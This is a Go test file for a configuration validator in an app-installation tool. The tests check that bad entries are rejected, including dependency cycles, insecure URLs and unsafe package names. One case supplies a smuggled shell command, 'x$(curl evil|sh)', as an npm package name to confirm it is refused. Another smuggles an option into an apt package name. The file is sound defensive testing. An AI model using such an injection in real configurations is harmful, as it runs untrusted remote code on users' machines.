package config

import (
	"strings"
	"testing"
)

func apps(a ...App) *Config {
	return &Config{Version: CurrentVersion, Apps: a}
}

func debian(spec InstallSpec) map[string]InstallSpec {
	return map[string]InstallSpec{"debian": spec}
}

func TestValidateReportsProblems(t *testing.T) {
	tests := []struct {
		name string
		cfg  *Config
		want string
	}{
		{"duplicate id", apps(App{ID: "a"}, App{ID: "a"}), "duplicate id"},
		{"unknown requires", apps(App{ID: "a", Requires: []string{"zzz"}}), "unknown app"},
		{"cycle", apps(App{ID: "a", Requires: []string{"b"}}, App{ID: "b", Requires: []string{"a"}}), "requires cycle"},
		{"two managers", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "x", Npm: "y"})}), "exactly one manager"},
		{"no manager", apps(App{ID: "a", Install: debian(InstallSpec{Classic: true})}), "exactly one manager"},
		{"deb_url without apt", apps(App{ID: "a", Install: debian(InstallSpec{Snap: "x", DebURL: "https://x.test/a.deb"})}), "deb_url needs"},
		{"unknown repo", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "x", Repo: "nope"})}), "unknown apt repo"},
		{"shell in npm", apps(App{ID: "a", Install: debian(InstallSpec{Npm: "x$(curl evil|sh)"})}), "unsafe npm"},
		{"option in apt", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "-oDebug=1"})}), "unsafe apt"},
		{"insecure deb_url", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "x", DebURL: "http://insecure"})}), "unsafe deb_url"},
		{"missing id", apps(App{}), "without id"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if !hasError(tt.cfg.Validate(), tt.want) {
				t.Errorf("no error containing %q in %v", tt.want, tt.cfg.Validate())
			}
		})
	}
}

func TestValidateAcceptsGoodConfig(t *testing.T) {
	cfg := apps(
		App{ID: "a", Files: "g", Install: debian(InstallSpec{Apt: "x", Repo: "r", DebURL: "https://x.test/a.deb"})},
		App{ID: "b", Requires: []string{"a"}, Install: debian(InstallSpec{Npm: "@scope/pkg@1.2"})},
	)
	cfg.Files = map[string][]FileMap{"g": {{Src: "files/g"}}}
	cfg.AptRepos = map[string]AptRepo{"r": {Source: "files/r.list"}}

	if errs := cfg.Validate(); len(errs) != 0 {
		t.Errorf("errors: %v", errs)
	}
}

func hasError(errs []error, part string) bool {
	for _, e := range errs {
		if strings.Contains(e.Error(), part) {
			return true
		}
	}

	return false
}
